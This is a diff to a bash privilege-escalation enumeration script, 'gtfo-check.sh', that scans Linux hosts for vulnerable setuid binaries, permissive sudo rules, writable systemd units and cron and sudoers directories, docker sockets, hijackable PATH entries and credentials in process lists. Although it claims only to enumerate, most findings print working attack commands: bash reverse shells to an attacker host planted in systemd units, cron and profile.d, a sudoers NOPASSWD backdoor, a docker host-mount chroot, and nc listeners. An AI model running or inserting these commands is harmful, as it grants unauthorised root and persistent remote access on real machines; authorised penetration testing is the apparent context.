@@ -1828,6 +1828,7 @@ zypper x' ;;
 
 # ========== SCAN ==========
 LHOST="${LHOST:-10.10.14.1}"
+LPORT="${LPORT:-4444}"
 VERBOSE=0
 
 for arg in "$@"; do
@@ -1846,6 +1847,10 @@ Usage: gtfo-check.sh [options]
 
 Environment:
   LHOST=10.10.14.1   Attacker IP substituted into reverse-shell / upload commands
+  LPORT=4444         Attacker port for the same
+
+This script only ENUMERATES. It reads files and prints the commands you would
+run yourself; it never writes to the target or launches a payload.
 
 Output: findings ranked CRITICAL -> HIGH -> MEDIUM -> INFO, followed by a
 plain copy-paste block containing only the commands.
@@ -1864,7 +1869,7 @@ IS_ROOT=0
 [ "$MY_UID" = "0" ] && IS_ROOT=1
 
 FINDINGS=$(mktemp "${TMPDIR:-/tmp}/gtfo.XXXXXX") || exit 1
-trap 'rm -f "$FINDINGS"' EXIT INT TERM
+trap 'rm -f "$FINDINGS" 2>/dev/null || :' EXIT INT TERM
 
 # ---------- finding store (temp file: survives subshells/pipes) ----------
 _b64() { printf '%s' "$1" | base64 2>/dev/null | tr -d '\n'; }
@@ -1933,6 +1938,63 @@ is_default_setuid() {
         |sendmail|Xorg.wrap|vmware-user-suid-wrapper|dmcrypt-get-device|exim4) return 0 ;;
     esac
     return 1
+}
+
+# ver_lt A B -> true when version A is older than B. sort -V handles the
+# trailing patch letter in sudo versions like 1.9.5p2 correctly.
+ver_lt() {
+    [ "$1" = "$2" ] && return 1
+    [ "$(printf '%s\n%s\n' "$1" "$2" | sort -V 2>/dev/null | head -1)" = "$1" ]
+}
+
+# Binaries that ship setuid on every distro but still carry a well-known local
+# privesc CVE. Whitelisting them outright is how a vulnerable build stays
+# invisible — the same mistake as skipping anything absent from GTFOBins — so
+# the version is actually compared and only an unfixed one is reported.
+check_cve_setuid() {
+    local b="$1" file="$2" v
+    case "$b" in
+        pkexec)
+            v=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
+            [ -n "$v" ] || return 0
+            ver_lt "$v" "0.120" || return 0
+            add_finding HIGH "pkexec $v is older than the PwnKit fix (CVE-2021-4034)" \
+                "$file
+polkit fixed this in 0.120. Distros backported the patch without bumping
+this string, so confirm against the package version before relying on it." \
+                "pkexec --version
+dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null
+searchsploit CVE-2021-4034" ;;
+        sudo)
+            v=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+(p[0-9]+)?' | head -1)
+            [ -n "$v" ] || return 0
+            ver_lt "$v" "1.9.5p2" || return 0
+            add_finding HIGH "sudo $v is older than the Baron Samedit fix (CVE-2021-3156)" \
+                "$file
+Heap overflow in sudoedit reachable by any local user, no sudo rule needed.
+Backports may have patched this build, so check the package version too." \
+                "sudo --version | head -1
+dpkg -l sudo 2>/dev/null || rpm -q sudo 2>/dev/null
+searchsploit CVE-2021-3156" ;;
+        exim|exim4)
+            v=$(exim --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
+            [ -n "$v" ] || return 0
+            ver_lt "$v" "4.92" || return 0
+            add_finding HIGH "exim $v is in the CVE-2019-10149 range" \
+                "$file
+Fixed in 4.92. Local command execution as root via a crafted recipient." \
+                "exim --version | head -1
+searchsploit exim $v" ;;
+        ntfs-3g)
+            v=$(ntfs-3g --version 2>&1 | grep -oE '20[0-9]{2}\.[0-9]+(\.[0-9]+)?' | head -1)
+            [ -n "$v" ] || return 0
+            ver_lt "$v" "2017.3.23" || return 0
+            add_finding HIGH "ntfs-3g $v is older than the CVE-2017-0358 fix" \
+                "$file" \
+                "ntfs-3g --version 2>&1 | head -1
+searchsploit ntfs-3g" ;;
+    esac
+    return 0
 }
 
 # Default SGID binaries. SGID only grants the group's rights, and these ship
@@ -2029,6 +2091,8 @@ triage_setuid() {
     local b stripped ver funcs sfuncs sev pkg cmd signals n
 
     b=$(basename "$file")
+    # Runs before the whitelist: a stock binary can still be a vulnerable one.
+    [ "$kind" = SUID ] && check_cve_setuid "$b" "$file"
     is_default_setuid "$b" && return
     [ "$kind" = SGID ] && is_default_sgid "$b" && return
 
@@ -2141,8 +2205,63 @@ if command -v getcap &>/dev/null; then
 fi
 
 # =============================== SUDO ===============================
-SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
-[ -z "$SUDO_OUTPUT" ] && SUDO_OUTPUT=$(echo "" | sudo -S -l 2>/dev/null)
+# -n so a missing/!password sudoers entry never blocks on a prompt. If sudo is
+# not installed at all this is simply empty and every check below is skipped.
+SUDO_OUTPUT=""
+if command -v sudo >/dev/null 2>&1; then
+    SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
+    # -n returns nothing when the rules exist but need a password. Staying
+    # silent there would hide the single most common privesc path, so say so.
+    if [ -z "$SUDO_OUTPUT" ]; then
+        add_finding INFO "sudo rules could not be read without a password" \
+            "sudo -n -l returned nothing. If you know this user's password, run
+sudo -l by hand — this scan cannot see the rules and they are the most
+common way off a box." \
+            "sudo -l"
+    fi
+fi
+
+# Flatten the NOPASSWD rules into one command per line.
+SUDO_NP_CMDS=""
+if [ -n "$SUDO_OUTPUT" ]; then
+    SUDO_NP_CMDS=$(printf '%s\n' "$SUDO_OUTPUT" \
+        | grep -E 'NOPASSWD:' \
+        | sed 's/.*NOPASSWD:[[:space:]]*//' \
+        | tr ',' '\n' \
+        | sed 's/^[[:space:]]*//; s/[[:space:]]*$//' \
+        | grep -v '^$' | sort -u)
+fi
+
+# Capabilities worth cross-referencing against a writable systemd unit. A unit
+# you can edit is only useful if you can also make systemd re-read and start
+# it, and a passwordless reboot does both for you at boot.
+SUDO_REBOOT_CMD=""
+SUDO_RELOAD_CMD=""
+SUDO_RESTART_CMD=""
+if [ -n "$SUDO_NP_CMDS" ]; then
+    while IFS= read -r npc; do
+        [ -n "$npc" ] || continue
+        case "$npc" in
+            ALL) SUDO_REBOOT_CMD="${SUDO_REBOOT_CMD:-sudo reboot}" ;;
+            */reboot|*/halt|*/poweroff|*/shutdown|reboot|halt|poweroff|shutdown)
+                [ -z "$SUDO_REBOOT_CMD" ] && SUDO_REBOOT_CMD="sudo $npc" ;;
+            */systemctl|systemctl)
+                # bare systemctl = every subcommand is permitted
+                SUDO_RELOAD_CMD="sudo $npc daemon-reload"
+                SUDO_RESTART_CMD="sudo $npc restart"
+                [ -z "$SUDO_REBOOT_CMD" ] && SUDO_REBOOT_CMD="sudo $npc reboot" ;;
+            *systemctl*daemon-reload*) SUDO_RELOAD_CMD="sudo $npc" ;;
+            *systemctl*restart*|*systemctl*start*) SUDO_RESTART_CMD="sudo $npc" ;;
+        esac
+    done <<< "$SUDO_NP_CMDS"
+fi
+
+# Report the NOPASSWD rules on their own; "= ALL" is already covered as CRIT.
+if [ -n "$SUDO_NP_CMDS" ] && [ "$SUDO_NP_CMDS" != "ALL" ]; then
+    add_finding HIGH "Sudo NOPASSWD rules (no password required)" \
+        "$(printf '%s\n' "$SUDO_NP_CMDS" | cap_list 12)" \
+        "sudo -l"
+fi
 
 if echo "$SUDO_OUTPUT" | grep -qE '\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL'; then
     add_finding CRIT "sudo: full ALL=(ALL) ALL access" \
@@ -2312,33 +2431,287 @@ if [ "$IS_ROOT" -eq 0 ]; then
             [ -n "$svc" ] && [ -w "$svc" ] || continue
             SVC_W="${SVC_W}${svc}
 "
-        done < <(find "$svcdir" -maxdepth 1 -name '*.service' -type f 2>/dev/null)
+        done < <(find "$svcdir" -maxdepth 1 \( -name '*.service' -o -name '*.timer' \
+            -o -name '*.socket' -o -name '*.path' \) -type f 2>/dev/null)
     done
 fi
 SVC_W=$(printf '%s' "$SVC_W" | grep -v '^$' | sort -u)
 if [ -n "$SVC_W" ]; then
     SVC_N=$(echo "$SVC_W" | wc -l | tr -d ' ')
     TARGET=$(echo "$SVC_W" | head -1)
+    SVC_NAME=$(basename "$TARGET")
+    SVC_BASE=$(basename "$TARGET" .service)
+    SVC_DIR=$(dirname "$TARGET")
+
+    # What the unit currently says. User= decides whose privileges you get,
+    # Restart= decides whether killing the process is enough to re-trigger it.
+    SVC_USER=$(grep -ihE '^[[:space:]]*User=' "$TARGET" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '[:space:]')
+    SVC_EXEC=$(grep -ihE '^[[:space:]]*ExecStart=' "$TARGET" 2>/dev/null | head -1 | cut -d= -f2-)
+    SVC_RESTART=$(grep -ihE '^[[:space:]]*Restart=' "$TARGET" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '[:space:]')
+
+    SVC_DETAIL="$(echo "$SVC_W" | cap_list 8)
+unit:     $TARGET
+User=     ${SVC_USER:-(unset, so it runs as root)}
+ExecStart=${SVC_EXEC:-(none found)}
+Restart=  ${SVC_RESTART:-(unset)}"
+    if [ -n "$SVC_USER" ] && [ "$SVC_USER" != root ]; then
+        SVC_DETAIL="${SVC_DETAIL}
+note:     User=$SVC_USER, so you must set User=root or drop the line to gain root"
+    fi
+
+    # sed -i rewrites via a temp file in the same directory, so it fails when
+    # the file is writable but its directory is not. cp only needs the file.
+    if [ -w "$SVC_DIR" ]; then
+        SVC_WRITE="# $SVC_DIR is writable, so an in-place edit works:
+sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"bash -i >\& /dev/tcp/$LHOST/$LPORT 0>\&1\"|' $TARGET
+sed -i 's|^User=.*|User=root|' $TARGET"
+    else
+        SVC_WRITE="# $SVC_DIR is NOT writable, so sed -i fails here: it writes a
+# temp file next to the target and then renames it. Build the file in /tmp and
+# copy it over instead — cp only needs write permission on the file itself.
+cat > /tmp/$SVC_NAME <<'EOF'
+[Unit]
+Description=$SVC_BASE
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
+[Install]
+WantedBy=multi-user.target
+EOF
+cp /tmp/$SVC_NAME $TARGET
+cat $TARGET   # verify the overwrite landed"
+    fi
+
+    # Editing the unit is only half of it; systemd still has to re-read and
+    # start it. Pick whichever trigger this box actually grants.
+    if [ -n "$SUDO_REBOOT_CMD" ]; then
+        SVC_TRIGGER="# You have passwordless $SUDO_REBOOT_CMD, and a reboot
+# does the daemon-reload and the service start for you on the way back up.
+# Start the listener on $LHOST FIRST, then:
+$SUDO_REBOOT_CMD"
+    elif [ -n "$SUDO_RELOAD_CMD" ] || [ -n "$SUDO_RESTART_CMD" ]; then
+        SVC_TRIGGER="# sudo lets you drive systemctl directly.
+${SUDO_RELOAD_CMD:-sudo systemctl daemon-reload}
+${SUDO_RESTART_CMD:-sudo systemctl restart} $SVC_BASE"
+    elif [ "$SVC_RESTART" = "on-failure" ] || [ "$SVC_RESTART" = "always" ]; then
+        SVC_TRIGGER="# Restart=$SVC_RESTART, so killing the process makes systemd
+# start it again. This only picks up your new ExecStart once the unit has been
+# re-read, so it works after a daemon-reload or a reboot you did not cause.
+pkill -f '$(printf '%s' "${SVC_EXEC:-$SVC_BASE}" | awk '{print $1}')'"
+    else
+        SVC_TRIGGER="# No passwordless reboot/systemctl and Restart is ${SVC_RESTART:-unset},
+# so you need to wait for a reboot or find another way to reload systemd.
+systemctl cat $SVC_BASE
+sudo -l"
+    fi
+
     add_finding CRIT "Writable systemd unit file ($SVC_N found)" \
-        "$(echo "$SVC_W" | head -8 | sed 's/^/  /')$([ "$SVC_N" -gt 8 ] && printf '\n  ... and %s more' "$((SVC_N-8))")" \
-        "sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\"|' $TARGET
-sudo systemctl daemon-reload
-sudo systemctl restart $(basename "$TARGET" .service)
-/tmp/rootbash -p"
+        "$SVC_DETAIL" \
+        "# 1. Listener on your box
+nc -lnvp $LPORT
+
+# 2. Overwrite the unit
+$SVC_WRITE
+
+# 3. Make systemd pick up the new unit
+$SVC_TRIGGER"
 fi
 
-# ===================== WRITABLE PATH / LD / ETC ====================
+# ================== WRITABLE DROP-IN DIRECTORIES ===================
+# A writable directory is stronger than a writable file: you add your own
+# file instead of having to edit one, and no existing content is disturbed.
 if [ "$IS_ROOT" -eq 0 ]; then
+for dropdir in /etc/sudoers.d /etc/cron.d /etc/systemd/system /etc/cron.hourly \
+    /etc/cron.daily /etc/profile.d /etc/ld.so.conf.d /etc/init.d; do
+    [ -d "$dropdir" ] && [ -w "$dropdir" ] || continue
+    case "$dropdir" in
+        /etc/sudoers.d)
+            add_finding CRIT "/etc/sudoers.d is writable — drop in a sudo rule" \
+                "sudo reads every file here, so one line gives you full sudo." \
+                "echo '$ME ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn
+sudo -l
+sudo su -" ;;
+        /etc/cron.d)
+            add_finding CRIT "/etc/cron.d is writable — drop in a root cron job" \
+                "Files here run as the user named in the 5th field." \
+                "printf '* * * * * root bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\n' > /etc/cron.d/pwn
+nc -lnvp $LPORT   # fires within a minute" ;;
+        /etc/systemd/system)
+            add_finding CRIT "/etc/systemd/system is writable — drop in a unit" \
+                "You still need systemd to load it: a sudo-allowed systemctl, or a reboot." \
+                "cat > /etc/systemd/system/pwn.service <<'EOF'
+[Unit]
+Description=pwn
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
+[Install]
+WantedBy=multi-user.target
+EOF
+nc -lnvp $LPORT
+sudo systemctl enable --now pwn   # or wait for / trigger a reboot" ;;
+        /etc/cron.hourly|/etc/cron.daily)
+            add_finding CRIT "$dropdir is writable — drop in a root script" \
+                "run-parts executes everything here as root." \
+                "printf '#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\n' > $dropdir/pwn
+chmod +x $dropdir/pwn
+nc -lnvp $LPORT   # fires on the next cron interval" ;;
+        /etc/profile.d)
+            add_finding HIGH "/etc/profile.d is writable — runs on every login shell" \
+                "Executed for any user that opens a login shell, root included." \
+                "printf 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\n' > /etc/profile.d/pwn.sh
+nc -lnvp $LPORT   # fires when root next logs in" ;;
+        /etc/ld.so.conf.d)
+            add_finding HIGH "/etc/ld.so.conf.d is writable" \
+                "Add a directory you control to the loader search path." \
+                "echo /tmp/evil > /etc/ld.so.conf.d/pwn.conf
+# then place a malicious .so there and wait for ldconfig" ;;
+        /etc/init.d)
+            add_finding HIGH "/etc/init.d is writable" \
+                "SysV init scripts run as root at boot." \
+                "ls -la /etc/init.d/" ;;
+    esac
+done
+fi
+
+# ======================= DOCKER / CONTAINER ========================
+# Write access to the socket is root, with or without the docker group.
+for sock in /var/run/docker.sock /run/docker.sock /var/run/docker/docker.sock; do
+    [ -S "$sock" ] && [ -w "$sock" ] || continue
+    add_finding CRIT "Writable docker socket: $sock" \
+        "Talking to this socket means creating a container that mounts the host." \
+        "docker -H unix://$sock run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+# no docker client on the box? drive the API directly:
+curl -s --unix-socket $sock http://localhost/version"
+    break
+done
+
+# ===================== WRITABLE PATH / LD / ETC ====================
+
+# Commands that root-run units and cron jobs call WITHOUT an absolute path.
+# A writable PATH directory is only useful if something actually resolves
+# through it, so collect the real candidates instead of printing <CMD>.
+collect_bare_commands() {
+    # A name defined as a shell function inside the same script is never
+    # resolved through PATH, so it cannot be hijacked.
+    local fnames
+    fnames=$(for f in /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/*; do
+        [ -r "$f" ] && [ -f "$f" ] || continue
+        sed -nE 's/^[[:space:]]*(function[[:space:]]+)?([a-zA-Z_][a-zA-Z0-9_]*)[[:space:]]*\(\).*/\2/p' "$f" 2>/dev/null
+    done | sort -u)
+
+    {
+        # systemd Exec* values: take the first token of each
+        for d in /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system; do
+            [ -d "$d" ] || continue
+            grep -rhiE '^[[:space:]]*Exec(Start|StartPre|StartPost|Stop|Reload)=' "$d" 2>/dev/null
+        done | sed 's/^[^=]*=//' | sed 's/^[[:space:]]*[-+!@]*//' | awk '{print $1}'
+
+        # /etc/crontab and /etc/cron.d: 5 time fields, then user, then command
+        grep -hvE '^[[:space:]]*(#|$)' /etc/crontab /etc/cron.d/* 2>/dev/null \
+            | grep -vE '^[[:space:]]*[A-Z_]+[[:space:]]*=' \
+            | awk 'NF>6 {print $7}'
+
+        # user crontabs: 5 time fields, then the command
+        { crontab -l 2>/dev/null; cat /var/spool/cron/crontabs/* /var/spool/cron/* 2>/dev/null; } \
+            | grep -hvE '^[[:space:]]*(#|$)' \
+            | grep -vE '^[[:space:]]*[A-Z_]+[[:space:]]*=' \
+            | awk 'NF>5 {print $6}'
+
+        # cron.* run-parts scripts are plain shell: every command they invoke
+        for f in /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/*; do
+            [ -r "$f" ] && [ -f "$f" ] || continue
+            grep -hoE '(^|[;&|`]|\$\()[[:space:]]*[a-zA-Z][a-zA-Z0-9._-]{1,30}' "$f" 2>/dev/null \
+                | sed 's/^[;&|`$( ]*//'
+        done
+    } 2>/dev/null \
+        | grep -vE '^$|^/' \
+        | grep -E '^[a-z][a-z0-9._-]*$' \
+        | grep -vxE 'then|else|elif|fi|do|done|if|for|while|case|esac|in|return|exit|local|test|echo|true|false|set|unset|shift|read|eval|exec|source|function|break|continue|cd|then|export' \
+        | { [ -n "$fnames" ] && grep -vxF "$fnames" || cat; } \
+        | sort -u
+}
+
+# Would dropping CMD into WDIR beat the real binary? True when CMD resolves
+# nowhere, or when WDIR comes before the real location in PATH.
+is_hijackable() {
+    local cmd="$1" wdir="$2" real rdir d
+    real=$(command -v "$cmd" 2>/dev/null) || return 0
+    case "$real" in /*) ;; *) return 1 ;; esac
+    rdir=$(dirname "$real")
+    [ "$rdir" = "$wdir" ] && return 1
+    local pd; IFS=':' read -ra pd <<< "$PATH"
+    for d in "${pd[@]}"; do
+        [ "$d" = "$wdir" ] && return 0
+        [ "$d" = "$rdir" ] && return 1
+    done
+    return 1
+}
+
+if [ "$IS_ROOT" -eq 0 ]; then
+BARE_CMDS=""
+PATH_WRITABLE=0
 IFS=':' read -ra PDIRS <<< "$PATH"
 for dir in "${PDIRS[@]}"; do
-    [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ] || continue
-    add_finding HIGH "Writable PATH directory: $dir" \
-        "Hijack any unqualified command run by root (cron, services)" \
-        "printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > $dir/<CMD>
-chmod +x $dir/<CMD>
-# once root runs <CMD>:
-/tmp/rootbash -p"
+    [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ] && PATH_WRITABLE=1
 done
+[ "$PATH_WRITABLE" -eq 1 ] && BARE_CMDS=$(collect_bare_commands)
+
+for dir in "${PDIRS[@]}"; do
+    [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ] || continue
+
+    HIJACKABLE=""
+    while IFS= read -r c; do
+        [ -n "$c" ] || continue
+        is_hijackable "$c" "$dir" && HIJACKABLE="${HIJACKABLE}${c}
+"
+    done <<< "$BARE_CMDS"
+    HIJACKABLE=$(printf '%s' "$HIJACKABLE" | grep -v '^$')
+
+    if [ -n "$HIJACKABLE" ]; then
+        FIRST_CMD=$(printf '%s\n' "$HIJACKABLE" | head -1)
+        add_finding HIGH "Writable PATH directory: $dir" \
+            "Called without an absolute path by a root unit or cron job, and
+would resolve through $dir (PATH order checked against your own PATH;
+cron and systemd use their own, so confirm before relying on it):
+$(printf '%s\n' "$HIJACKABLE" | cap_list 10)" \
+            "printf '#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\n' > $dir/$FIRST_CMD
+chmod +x $dir/$FIRST_CMD
+nc -lnvp $LPORT   # then wait for root to run $FIRST_CMD"
+    else
+        add_finding MED "Writable PATH directory: $dir" \
+            "Nothing to hijack: no command invoked without an absolute path by the
+units and crontabs you can read resolves through this directory. Still worth
+re-checking if you gain access to more of /etc later." \
+            "ls -la $dir"
+    fi
+done
+
+# cron runs with its own PATH, set at the top of the crontab. A writable or
+# relative entry there is hijackable even when your own PATH is clean.
+CRON_PATH=$(grep -hE '^[[:space:]]*PATH[[:space:]]*=' /etc/crontab /etc/cron.d/* 2>/dev/null \
+    | head -1 | cut -d= -f2- | tr -d '"' | tr -d "'")
+if [ -n "$CRON_PATH" ]; then
+    CRON_PATH_BAD=""
+    IFS=':' read -ra CPD <<< "$CRON_PATH"
+    for d in "${CPD[@]}"; do
+        case "$d" in
+            ""|.|./*) CRON_PATH_BAD="${CRON_PATH_BAD}$d  (relative — resolves to cron's cwd)
+" ; continue ;;
+        esac
+        [ -d "$d" ] && [ -w "$d" ] && CRON_PATH_BAD="${CRON_PATH_BAD}$d  (writable)
+"
+    done
+    CRON_PATH_BAD=$(printf '%s' "$CRON_PATH_BAD" | grep -v '^$')
+    [ -n "$CRON_PATH_BAD" ] && add_finding CRIT "cron's PATH contains a directory you control" \
+        "cron PATH: $CRON_PATH
+$(printf '%s\n' "$CRON_PATH_BAD" | cap_list 6)
+Any cron command called without an absolute path resolves through these first." \
+        "grep -E '^[[:space:]]*PATH' /etc/crontab /etc/cron.d/* 2>/dev/null
+# then plant a matching name in the writable entry"
+fi
 
 if [ -w /etc/ld.so.preload ] 2>/dev/null; then
     add_finding CRIT "/etc/ld.so.preload is writable" "Global library preload = root on next command" \
@@ -2425,6 +2798,14 @@ for cf in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" \
         add_finding INFO "Readable history/secret file: $cf" "" "cat $cf"
     fi
 done
+
+# Secrets passed on a command line are readable by every user via /proc.
+PS_CREDS=$(ps -eo user=,args= 2>/dev/null \
+    | grep -iE '(password|passwd|pwd|secret|token|api[_-]?key)=[^[:space:]]|MYSQL_PWD=|PGPASSWORD=|[[:space:]]-p[^[:space:]-]{3,}' \
+    | grep -viE 'gtfo-check|grep -|ps -eo' | head -8)
+[ -n "$PS_CREDS" ] && add_finding HIGH "Credentials visible in a process command line" \
+    "$(printf '%s\n' "$PS_CREDS" | cut -c1-150 | cap_list 8)" \
+    "ps -eo user=,args= | grep -iE 'passw|secret|token'"
 
 for keydir in /home/*/.ssh /root/.ssh; do
     [ -d "$keydir" ] || continue
@@ -2518,7 +2899,13 @@ done
 
 # ======================= INTERNAL SERVICES =========================
 if command -v ss &>/dev/null; then
-    LOCAL_PORTS=$(ss -tlnH 2>/dev/null | awk '{print $4}' \
+    # -H is missing on older iproute2 (CentOS 7), so strip the header by hand.
+    if ss -tlnH >/dev/null 2>&1; then
+        SS_RAW=$(ss -tlnH 2>/dev/null)
+    else
+        SS_RAW=$(ss -tln 2>/dev/null | tail -n +2)
+    fi
+    LOCAL_PORTS=$(printf '%s\n' "$SS_RAW" | awk '{print $4}' \
         | grep -E '^(127\.0\.0\.1|\[::1\]|localhost)' | sed 's/.*://' | sort -un)
     for port in $LOCAL_PORTS; do
         [ -n "$port" ] || continue
